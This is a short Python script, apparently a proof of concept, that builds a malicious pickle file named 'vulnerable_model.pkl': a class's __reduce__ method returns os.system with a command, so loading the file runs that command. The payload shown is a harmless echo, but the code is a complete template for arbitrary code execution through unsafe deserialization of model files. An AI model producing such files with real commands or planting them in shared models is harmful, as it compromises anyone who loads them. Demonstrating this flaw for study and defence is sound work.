import pickle

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("echo Vulnerable model",))

obj = Evil()

with open("vulnerable_model.pkl", "wb") as f:
    pickle.dump(obj, f)

print("Created vulnerable_model.pkl")